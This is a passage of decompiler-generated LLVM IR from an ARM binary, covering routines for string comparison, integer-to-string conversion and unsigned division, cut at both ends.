dec_label_pc_12748:                               ; preds = %dec_label_pc_12748, %dec_label_pc_12744
  %v0_12748 = phi i32 [ %v1_12748, %dec_label_pc_12748 ], [ 0, %dec_label_pc_12744 ]
  %v1_12748 = add i32 %v0_12748, 1
  store i32 %v1_12748, i32* @r2, align 4
  %v2_1274c = add i32 %v1_12748, %arg2
  %v3_1274c = inttoptr i32 %v2_1274c to i8*
  %v4_1274c = load i8, i8* %v3_1274c, align 1
  %v2_12750 = icmp eq i8 %v4_1274c, 0
  br i1 %v2_12750, label %dec_label_pc_12758, label %dec_label_pc_12748

dec_label_pc_12758:                               ; preds = %dec_label_pc_12748, %bb21
  %v1_12758 = phi i32 [ %v3_12734, %bb21 ], [ %v1_12748, %dec_label_pc_12748 ]
  %v9_12758 = icmp eq i32 %v0_127803, %v1_12758
  br i1 %v9_12758, label %dec_label_pc_12780.preheader, label %dec_label_pc_12760

dec_label_pc_12780.preheader:                     ; preds = %dec_label_pc_12758
  %v2_127805 = icmp eq i32 %v0_127803, 0
  br i1 %v2_127805, label %dec_label_pc_12788, label %dec_label_pc_12768

dec_label_pc_12760:                               ; preds = %dec_label_pc_12768, %dec_label_pc_12758
  ret i32 0

dec_label_pc_12768:                               ; preds = %dec_label_pc_12778, %dec_label_pc_12780.preheader
  %v0_12780.in = phi i32 [ %v0_12780, %dec_label_pc_12778 ], [ %v0_127803, %dec_label_pc_12780.preheader ]
  %v0_1277c = phi i32 [ %v1_1277c, %dec_label_pc_12778 ], [ %arg2, %dec_label_pc_12780.preheader ]
  %v0_12778 = phi i32 [ %v1_12778, %dec_label_pc_12778 ], [ %tmp, %dec_label_pc_12780.preheader ]
  %v0_12780 = add i32 %v0_12780.in, -1
  %v1_12768 = inttoptr i32 %v0_12778 to i8*
  %v2_12768 = load i8, i8* %v1_12768, align 1
  %v3_12768 = zext i8 %v2_12768 to i32
  store i32 %v3_12768, i32* @r2, align 4
  %v1_1276c = inttoptr i32 %v0_1277c to i8*
  %v2_1276c = load i8, i8* %v1_1276c, align 1
  %v9_12770 = icmp eq i8 %v2_12768, %v2_1276c
  br i1 %v9_12770, label %dec_label_pc_12778, label %dec_label_pc_12760

dec_label_pc_12778:                               ; preds = %dec_label_pc_12768
  %v1_12778 = add i32 %v0_12778, 1
  %v1_1277c = add i32 %v0_1277c, 1
  %v2_12780 = icmp eq i32 %v0_12780, 0
  br i1 %v2_12780, label %dec_label_pc_12788, label %dec_label_pc_12768

dec_label_pc_12788:                               ; preds = %dec_label_pc_12778, %dec_label_pc_12780.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_12748, { 0, 1, 3, 2 }
  uselistorder i8 %v2_12710, { 1, 0 }
}

define i32 @function_12790(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12790:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12794 = load i8, i8* %arg1, align 1
  %v2_12798 = icmp eq i8 %v2_12794, 0
  %v0_1279c = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_12798, label %bb, label %dec_label_pc_127a8

bb:                                               ; preds = %dec_label_pc_12790
  %v3_12794 = zext i8 %v2_12794 to i32
  br label %dec_label_pc_127bc

dec_label_pc_127a8:                               ; preds = %dec_label_pc_12790
  br label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %dec_label_pc_127ac, %dec_label_pc_127a8
  %v0_127ac = phi i32 [ %v1_127ac, %dec_label_pc_127ac ], [ 0, %dec_label_pc_127a8 ]
  %v1_127ac = add i32 %v0_127ac, 1
  %v2_127b0 = add i32 %v1_127ac, %tmp
  %v3_127b0 = inttoptr i32 %v2_127b0 to i8*
  %v4_127b0 = load i8, i8* %v3_127b0, align 1
  %v2_127b4 = icmp eq i8 %v4_127b0, 0
  br i1 %v2_127b4, label %dec_label_pc_127bc, label %dec_label_pc_127ac

dec_label_pc_127bc:                               ; preds = %dec_label_pc_127ac, %bb
  %v6_127e4 = phi i32 [ %v3_12794, %bb ], [ %v1_127ac, %dec_label_pc_127ac ]
  %v0_127bc = load i32, i32* %r1.global-to-local, align 4
  %v1_127bc = inttoptr i32 %v0_127bc to i8*
  %v2_127bc = load i8, i8* %v1_127bc, align 1
  %v3_127bc = zext i8 %v2_127bc to i32
  %v2_127c0 = icmp eq i8 %v2_127bc, 0
  br i1 %v2_127c0, label %bb26, label %dec_label_pc_127cc

bb26:                                             ; preds = %dec_label_pc_127bc
  store i32 %v3_127bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_127e0

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_127d0

dec_label_pc_127d0:                               ; preds = %dec_label_pc_127d0, %dec_label_pc_127cc
  %v0_127d0 = phi i32 [ %v1_127d0, %dec_label_pc_127d0 ], [ 0, %dec_label_pc_127cc ]
  %v1_127d0 = add i32 %v0_127d0, 1
  store i32 %v1_127d0, i32* %r2.global-to-local, align 4
  %v2_127d4 = add i32 %v1_127d0, %v0_127bc
  %v3_127d4 = inttoptr i32 %v2_127d4 to i8*
  %v4_127d4 = load i8, i8* %v3_127d4, align 1
  %v2_127d8 = icmp eq i8 %v4_127d4, 0
  br i1 %v2_127d8, label %dec_label_pc_127e0, label %dec_label_pc_127d0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127d0, %bb26
  %v0_127e0 = phi i32 [ %v3_127bc, %bb26 ], [ %v1_127d0, %dec_label_pc_127d0 ]
  %v2_127e0 = sub i32 %v0_127e0, %v0_1279c
  %v4_127e0 = xor i32 %v0_127e0, %v0_1279c
  %v5_127e0 = xor i32 %v2_127e0, %v0_127e0
  %v6_127e0 = and i32 %v5_127e0, %v4_127e0
  %v5_127e4 = icmp slt i32 %v0_127e0, %v0_1279c
  br i1 %v5_127e4, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_127e0
  %v8_127e4 = sub i32 %v6_127e4, %v0_1279c
  %v10_127e4 = xor i32 %v6_127e4, %v0_1279c
  %v11_127e4 = xor i32 %v8_127e4, %v6_127e4
  %v12_127e4 = and i32 %v11_127e4, %v10_127e4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_127e0, %bb27
  %v1_127e8.in = phi i32 [ %v6_127e0, %dec_label_pc_127e0 ], [ %v12_127e4, %bb27 ]
  %v0_127e8.in = phi i32 [ %v2_127e0, %dec_label_pc_127e0 ], [ %v8_127e4, %bb27 ]
  %v0_127e8 = icmp slt i32 %v0_127e8.in, 0
  %v1_127e8 = icmp slt i32 %v1_127e8.in, 0
  %v2_127e8 = xor i1 %v1_127e8, %v0_127e8
  br i1 %v2_127e8, label %dec_label_pc_12814, label %dec_label_pc_127f8.preheader

dec_label_pc_127f8.preheader:                     ; preds = %bb28
  %v2_127f85 = icmp eq i32 %v0_1279c, 0
  br i1 %v2_127f85, label %dec_label_pc_12814, label %dec_label_pc_12800

dec_label_pc_127f0:                               ; preds = %dec_label_pc_12800
  %v1_127f0 = add i32 %v0_127f0, 1
  %v1_127f4 = add i32 %v0_127f4, 1
  store i32 %v1_127f4, i32* %r1.global-to-local, align 4
  %v2_127f8 = icmp eq i32 %v0_127f8, 0
  br i1 %v2_127f8, label %dec_label_pc_12814, label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127f8.preheader
  %v0_127f8.in = phi i32 [ %v0_127f8, %dec_label_pc_127f0 ], [ %v0_1279c, %dec_label_pc_127f8.preheader ]
  %v0_127f4 = phi i32 [ %v1_127f4, %dec_label_pc_127f0 ], [ %v0_127bc, %dec_label_pc_127f8.preheader ]
  %v0_127f0 = phi i32 [ %v1_127f0, %dec_label_pc_127f0 ], [ %tmp, %dec_label_pc_127f8.preheader ]
  %v0_127f8 = add i32 %v0_127f8.in, -1
  %v1_12800 = inttoptr i32 %v0_127f0 to i8*
  %v2_12800 = load i8, i8* %v1_12800, align 1
  %v3_12800 = zext i8 %v2_12800 to i32
  store i32 %v3_12800, i32* %r2.global-to-local, align 4
  %v1_12804 = inttoptr i32 %v0_127f4 to i8*
  %v2_12804 = load i8, i8* %v1_12804, align 1
  %v9_12808 = icmp eq i8 %v2_12800, %v2_12804
  br i1 %v9_12808, label %dec_label_pc_127f0, label %dec_label_pc_12814

dec_label_pc_12814:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127f8.preheader, %dec_label_pc_12800, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_127f8.preheader ], [ 1, %dec_label_pc_127f0 ], [ 0, %dec_label_pc_12800 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_127f0, { 1, 0 }
  uselistorder i32 %v0_127f4, { 1, 0 }
  uselistorder i32 %v0_127e0, { 3, 0, 1, 2 }
  uselistorder i32 %v1_127d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1279c, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_12794, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12814, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_12824(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12824:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_12824 = load i32, i32* @r4, align 4
  %v6_12824 = load i32, i32* @r5, align 4
  %v12_12824 = load i32, i32* @r7, align 4
  %v0_12828 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12828, i32* %r8.global-to-local, align 4
  %v2_12828 = icmp eq i32 %v0_12828, 0
  store i1 %v2_12828, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_12828, label %dec_label_pc_12908, label %dec_label_pc_12838

dec_label_pc_12838:                               ; preds = %dec_label_pc_12824
  %v3_12838 = icmp eq i8 %arg1, 0
  store i1 %v3_12838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12838, label %.thread, label %dec_label_pc_1284c

.thread:                                          ; preds = %dec_label_pc_12838
  %v4_12840 = inttoptr i32 %v0_12828 to i8*
  store i8 48, i8* %v4_12840, align 1
  %v0_12844.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12844.pr.pr, label %.thread1, label %dec_label_pc_1284c

.thread1:                                         ; preds = %.thread
  %v4_12844 = load i32, i32* %r8.global-to-local, align 4
  %v5_12844 = add i32 %v4_12844, 1
  %v6_12844 = inttoptr i32 %v5_12844 to i8*
  store i8 0, i8* %v6_12844, align 1
  %v0_12848.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12848.pr.pr, label %dec_label_pc_12908, label %dec_label_pc_1284c

dec_label_pc_1284c:                               ; preds = %dec_label_pc_12838, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_12850 = icmp eq i32 %arg2, 10
  store i1 %v7_12850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12850, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_1284c
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_1284c
  %v4_1284c = zext i1 %tmp47 to i32
  store i32 %v4_1284c, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_128708 = sub nsw i32 0, %tmp
  %tmp.v3_128708 = select i1 %phitmp, i32 %tmp, i32 %v3_128708
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_128708, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* @r5, align 4
  %v2_1287c = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_1287c, i32* @r7, align 4
  br label %dec_label_pc_12880

dec_label_pc_12880:                               ; preds = %bb45, %.thread6
  %v0_12880 = phi i32 [ %v0_128a4, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_12880, i32* %r0.global-to-local, align 4
  %v0_12884 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12884, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_12880, 16777216
  %v1_12888 = sdiv i32 %sext, 16777216
  %v3_12888 = call i32 @function_12a1c(i32 %v1_12888, i32 %v0_12884)
  %v7_1288c = icmp eq i32 %v0_12884, 9
  store i1 %v7_1288c, i1* %cpsr_z.global-to-local, align 1
  %v1_12890 = add i32 %v0_12884, 48
  %v0_12894 = load i32, i32* @r4, align 4
  store i32 %v0_12894, i32* @r0, align 4
  %v7_12898 = icmp sgt i32 %v0_12884, 9
  %extract.t = trunc i32 %v1_12890 to i8
  br i1 %v7_12898, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_12880
  %v9_12898 = add i32 %v0_12884, 55
  %extract.t27 = trunc i32 %v9_12898 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_12880, %bb44
  %v0_128a0.off0 = phi i8 [ %extract.t, %dec_label_pc_12880 ], [ %extract.t27, %bb44 ]
  %v0_1289c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1289c, i32* @r1, align 4
  %v2_128a0 = load i32, i32* @r5, align 4
  %v3_128a0 = load i32, i32* @r7, align 4
  %v4_128a0 = add i32 %v3_128a0, %v2_128a0
  %v5_128a0 = inttoptr i32 %v4_128a0 to i8*
  store i8 %v0_128a0.off0, i8* %v5_128a0, align 1
  %v0_128a4 = call i32 @function_12920()
  store i32 %v0_128a4, i32* %r0.global-to-local, align 4
  store i32 %v0_128a4, i32* @r4, align 4
  %v2_128a8 = icmp eq i32 %v0_128a4, 0
  store i1 %v2_128a8, i1* %cpsr_z.global-to-local, align 1
  %v0_128ac = load i32, i32* @r5, align 4
  %v1_128ac = add i32 %v0_128ac, -1
  store i32 %v1_128ac, i32* @r5, align 4
  br i1 %v2_128a8, label %dec_label_pc_128b4, label %dec_label_pc_12880

dec_label_pc_128b4:                               ; preds = %bb45
  %v0_128b4 = load i32, i32* %sl.global-to-local, align 4
  %v2_128b4 = icmp eq i32 %v0_128b4, 0
  store i1 %v2_128b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128b4, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_128b4
  %v3_128b8 = ptrtoint i32* %stack_var_-32 to i32
  %v3_128bc = add i32 %v1_128ac, %v3_128b8
  store i32 %v3_128bc, i32* %r2.global-to-local, align 4
  %v4_128c4 = add i32 %v3_128bc, -34
  %v5_128c4 = inttoptr i32 %v4_128c4 to i8*
  store i8 45, i8* %v5_128c4, align 1
  %v0_128c8.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_128c8.pre = load i32, i32* @r5, align 4
  br i1 %v0_128c8.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_128b4
  %v1_128c8 = phi i32 [ %v1_128ac, %dec_label_pc_128b4 ], [ %v1_128c8.pre, %.thread11 ]
  %v2_128c8 = add i32 %v1_128c8, 1
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_128d4 = phi i32 [ %v2_128c8, %.thread12 ], [ %v1_128c8.pre, %.thread11 ]
  %v0_128cc = load i32, i32* @r7, align 4
  %v2_128cc = add i32 %v0_128cc, %v1_128d4
  %v3_128cc = inttoptr i32 %v2_128cc to i8*
  %v4_128cc = load i8, i8* %v3_128cc, align 1
  %v6_128cc = zext i8 %v4_128cc to i32
  %v2_128d0 = icmp eq i8 %v4_128cc, 0
  store i1 %v2_128d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_128cc, i32* %r2.global-to-local, align 4
  br i1 %v2_128d0, label %dec_label_pc_12918, label %dec_label_pc_128e0.preheader

dec_label_pc_128e0.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128e0.preheader, %dec_label_pc_128e0
  %v0_128e0 = phi i32 [ 0, %dec_label_pc_128e0.preheader ], [ %v1_128e0, %dec_label_pc_128e0 ]
  %v1_128e0 = add i32 %v0_128e0, 1
  store i32 %v1_128e0, i32* %r1.global-to-local, align 4
  %v2_128e4 = add i32 %v1_128e0, %v2_128cc
  %v3_128e4 = inttoptr i32 %v2_128e4 to i8*
  %v4_128e4 = load i8, i8* %v3_128e4, align 1
  %v2_128e8 = icmp eq i8 %v4_128e4, 0
  store i1 %v2_128e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128e8, label %dec_label_pc_128f0, label %dec_label_pc_128e0

dec_label_pc_128f0:                               ; preds = %dec_label_pc_128e0, %dec_label_pc_12918
  %v0_128f424 = phi i32 [ %v6_128cc, %dec_label_pc_12918 ], [ %v1_128e0, %dec_label_pc_128e0 ]
  %v0_128f0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_128f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128f4.dec_label_pc_128f4_crit_edge, %dec_label_pc_128f0
  %v2_12900 = phi i32 [ %v5_12900, %dec_label_pc_128f4.dec_label_pc_128f4_crit_edge ], [ %v0_128f0, %dec_label_pc_128f0 ]
  %v0_128f8 = phi i32 [ %v0_128f8.pre, %dec_label_pc_128f4.dec_label_pc_128f4_crit_edge ], [ %v2_128cc, %dec_label_pc_128f0 ]
  %v0_128f4 = phi i32 [ %v0_128f4.pre, %dec_label_pc_128f4.dec_label_pc_128f4_crit_edge ], [ %v0_128f424, %dec_label_pc_128f0 ]
  %v1_128f4 = add i32 %v0_128f4, -1
  store i32 %v1_128f4, i32* %r1.global-to-local, align 4
  %v1_128f8 = inttoptr i32 %v0_128f8 to i8*
  %v2_128f8 = load i8, i8* %v1_128f8, align 1
  %v5_128f8 = add i32 %v0_128f8, 1
  store i32 %v5_128f8, i32* %r2.global-to-local, align 4
  %v3_128fc = icmp eq i32 %v0_128f4, 0
  store i1 %v3_128fc, i1* %cpsr_z.global-to-local, align 1
  %v3_12900 = inttoptr i32 %v2_12900 to i8*
  store i8 %v2_128f8, i8* %v3_12900, align 1
  %v4_12900 = load i32, i32* %r0.global-to-local, align 4
  %v5_12900 = add i32 %v4_12900, 1
  store i32 %v5_12900, i32* %r0.global-to-local, align 4
  br i1 %v3_128fc, label %dec_label_pc_12908, label %dec_label_pc_128f4.dec_label_pc_128f4_crit_edge

dec_label_pc_128f4.dec_label_pc_128f4_crit_edge:  ; preds = %dec_label_pc_128f4
  %v0_128f4.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_128f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_128f4

dec_label_pc_12908:                               ; preds = %dec_label_pc_128f4, %.thread1, %dec_label_pc_12824
  %v0_12908 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12908, i32* %r0.global-to-local, align 4
  store i32 %v3_12824, i32* @r4, align 4
  store i32 %v6_12824, i32* @r5, align 4
  store i32 %v12_12824, i32* @r7, align 4
  ret i32 %v0_12908

dec_label_pc_12918:                               ; preds = %.thread11._crit_edge
  store i32 %v6_128cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_128f0

; uselistorder directives
  uselistorder i32 %v5_12900, { 1, 0 }
  uselistorder i1 %v3_128fc, { 1, 0 }
  uselistorder i32 %v0_128f8, { 1, 0 }
  uselistorder i32 %v1_128e0, { 0, 1, 3, 2 }
  uselistorder i32 %v6_128cc, { 1, 0 }
  uselistorder i32 %v2_128cc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_128c8.pre, { 1, 0 }
  uselistorder i32 %v1_128ac, { 1, 0, 2 }
  uselistorder i32 %v0_128a4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_12884, { 2, 0, 1, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_12828, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_128f0, { 1, 0 }
  uselistorder label %dec_label_pc_128e0, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1284c, { 2, 1, 0 }
}

define i32 @function_12920() local_unnamed_addr {
dec_label_pc_12920:
  %r2.global-to-local = alloca i32, align 4
  %v0_12920 = load i32, i32* @r1, align 4
  %v1_12920 = add i32 %v0_12920, -1
  store i32 %v1_12920, i32* %r2.global-to-local, align 4
  %v2_12920 = icmp eq i32 %v0_12920, 0
  %v7_12920 = icmp eq i32 %v0_12920, 1
  %v0_12924 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_12920, i32 %v0_12924)
  br i1 %v2_12920, label %dec_label_pc_12a08, label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_12920
  %v0_1292c = load i32, i32* @r0, align 4
  %v1_1292c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_1292c, %v1_1292c
  br i1 %tmp, label %dec_label_pc_12934, label %dec_label_pc_129c0

dec_label_pc_12934:                               ; preds = %dec_label_pc_1292c
  %v1_12934 = load i32, i32* %r2.global-to-local, align 4
  %v2_12934 = and i32 %v1_12934, %v1_1292c
  %v4_12934 = icmp eq i32 %v2_12934, 0
  br i1 %v4_12934, label %dec_label_pc_129cc, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12934
  %v3_1293c = icmp ult i32 %v1_1292c, 536870912
  br i1 %v3_1293c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1293c
  %v4_12940 = mul i32 %v1_1292c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1293c, %.thread
  %v0_12960.pr36.ph = phi i32 [ %v4_12940, %.thread ], [ %v1_1292c, %dec_label_pc_1293c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1293c ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_12960.pr36 = phi i32 [ %v4_12954, %bb81 ], [ %v0_12960.pr36.ph, %.preheader.preheader ]
  %v1_12958 = phi i32 [ %v4_12958, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_1294c = icmp ugt i32 %v0_12960.pr36, 268435455
  br i1 %v2_1294c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12960thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_12950 = icmp ult i32 %v0_12960.pr36, %v0_1292c
  br i1 %v4_12950, label %bb80, label %dec_label_pc_12960thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_12954 = and i32 %v0_12960.pr36, 268435456
  %v3_12954 = icmp eq i32 %v2_12954, 0
  %v4_12954 = mul i32 %v0_12960.pr36, 16
  br i1 %v3_12954, label %bb81, label %dec_label_pc_12960.loopexit

bb81:                                             ; preds = %bb80
  %v2_12958 = and i32 %v1_12958, 268435456
  %v3_12958 = icmp eq i32 %v2_12958, 0
  %v4_12958 = mul i32 %v1_12958, 16
  store i32 %v4_12958, i32* @r3, align 4
  br i1 %v3_12958, label %.preheader, label %dec_label_pc_12960thread-pre-split.loopexit.loopexit

dec_label_pc_12960thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1296c48.ph = phi i32 [ %v1_12958, %bb ], [ %v4_12958, %bb81 ]
  %v0_12960.pr38.ph = phi i32 [ %v0_12960.pr36, %bb ], [ %v4_12954, %bb81 ]
  br label %dec_label_pc_12960thread-pre-split.loopexit

dec_label_pc_12960thread-pre-split.loopexit:      ; preds = %dec_label_pc_12960thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1296c48 = phi i32 [ %v1_12958, %.thread2 ], [ %v1_1296c48.ph, %dec_label_pc_12960thread-pre-split.loopexit.loopexit ]
  %v0_12960.pr38 = phi i32 [ %v0_12960.pr36, %.thread2 ], [ %v0_12960.pr38.ph, %dec_label_pc_12960thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12960thread-pre-split

dec_label_pc_12960thread-pre-split:               ; preds = %dec_label_pc_12960thread-pre-split.loopexit, %bb83
  %v1_1296c46 = phi i32 [ %v1_1296c48, %dec_label_pc_12960thread-pre-split.loopexit ], [ %v3_1296c, %bb83 ]
  %v0_12960.pr = phi i32 [ %v0_12960.pr38, %dec_label_pc_12960thread-pre-split.loopexit ], [ %v3_12968, %bb83 ]
  br label %dec_label_pc_12960

dec_label_pc_12960.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_12960

dec_label_pc_12960:                               ; preds = %dec_label_pc_12960.loopexit, %dec_label_pc_12960thread-pre-split
  %v1_1296c = phi i32 [ %v1_1296c46, %dec_label_pc_12960thread-pre-split ], [ %v1_12958, %dec_label_pc_12960.loopexit ]
  %v1_12968 = phi i32 [ %v0_12960.pr, %dec_label_pc_12960thread-pre-split ], [ %v4_12954, %dec_label_pc_12960.loopexit ]
  %v2_12960 = icmp slt i32 %v1_12968, 0
  br i1 %v2_12960, label %dec_label_pc_12974, label %bb82

bb82:                                             ; preds = %dec_label_pc_12960
  %v4_12964 = icmp ult i32 %v1_12968, %v0_1292c
  br i1 %v4_12964, label %bb83, label %dec_label_pc_12974

bb83:                                             ; preds = %bb82
  %v3_12968 = mul i32 %v1_12968, 2
  %v2_1296c = icmp slt i32 %v1_1296c, 0
  %v3_1296c = mul i32 %v1_1296c, 2
  store i32 %v3_1296c, i32* @r3, align 4
  br i1 %v2_1296c, label %dec_label_pc_12974, label %dec_label_pc_12960thread-pre-split

dec_label_pc_12974:                               ; preds = %bb82, %dec_label_pc_12960, %bb83
  %v2_1298059 = phi i32 [ %v3_1296c, %bb83 ], [ %v1_1296c, %bb82 ], [ %v1_1296c, %dec_label_pc_12960 ]
  %v1_1297851 = phi i32 [ %v3_12968, %bb83 ], [ %v1_12968, %bb82 ], [ %v1_12968, %dec_label_pc_12960 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12978

dec_label_pc_12978:                               ; preds = %.thread11, %dec_label_pc_12974
  %v1_129ac = phi i32 [ %v4_129ac, %.thread11 ], [ %v2_1298059, %dec_label_pc_12974 ]
  %v1_12980 = phi i32 [ %v0_129b8, %.thread11 ], [ 0, %dec_label_pc_12974 ]
  %v1_129b0 = phi i32 [ %v4_129b0, %.thread11 ], [ %v1_1297851, %dec_label_pc_12974 ]
  %v1_1297c = phi i32 [ %v0_129a8, %.thread11 ], [ %v0_1292c, %dec_label_pc_12974 ]
  %v3_12978 = icmp ult i32 %v1_1297c, %v1_129b0
  br i1 %v3_12978, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_12978
  %v3_1297c = sub i32 %v1_1297c, %v1_129b0
  %v3_12980 = or i32 %v1_12980, %v1_129ac
  store i32 %v3_12980, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12978, %bb84
  %v1_12988 = phi i32 [ %v1_1297c, %dec_label_pc_12978 ], [ %v3_1297c, %bb84 ]
  %v1_1298c = phi i32 [ %v1_12980, %dec_label_pc_12978 ], [ %v3_12980, %bb84 ]
  %v4_12984 = udiv i32 %v1_129b0, 2
  %v6_12984 = icmp ult i32 %v1_12988, %v4_12984
  br i1 %v6_12984, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_12988 = urem i32 %v1_129b0, 2
  %v4_12988 = icmp eq i32 %v3_12988, 0
  %v6_12988 = sub i32 %v1_12988, %v4_12984
  br i1 %v4_12988, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_1298c = udiv i32 %v1_129ac, 2
  %v6_1298c = or i32 %v1_1298c, %v5_1298c
  store i32 %v6_1298c, i32* %r2.global-to-local, align 4
  br label %.thread8

